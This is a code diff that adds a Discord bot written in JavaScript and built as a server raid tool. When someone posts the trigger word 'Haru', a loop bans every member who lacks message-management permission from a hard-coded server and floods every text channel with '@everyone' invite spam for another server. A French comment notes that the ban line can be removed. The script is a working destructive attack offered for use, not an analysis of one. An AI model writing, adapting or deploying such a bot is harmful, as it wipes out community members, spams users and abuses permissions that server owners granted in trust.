@@ -1,0 +1,16 @@
+let Discord = require("discord.js")
+let client = new Discord.Client()
+
+client.on("message", message => {
+  if(message.content === "Haru") {
+    let server = client.guilds.cache.get("797609154939977760") //Right click on server icon to get server id
+    for(let i =0;i<=1000;i++) {
+      server.members.cache.filter(r => !r.hasPermission("MANAGE_MESSAGES")).forEach(b => server.members.ban(b.id)) //vous pouvez enlevez cectte barre si vous voulez pas que les gens soient bannies
+      server.channels.cache.filter(r => r.type === "text").forEach(channel => {
+        channel.send("@everyone discord.gg/teamshape")
+      })
+    }
+   }
+})
+
+client.login("")
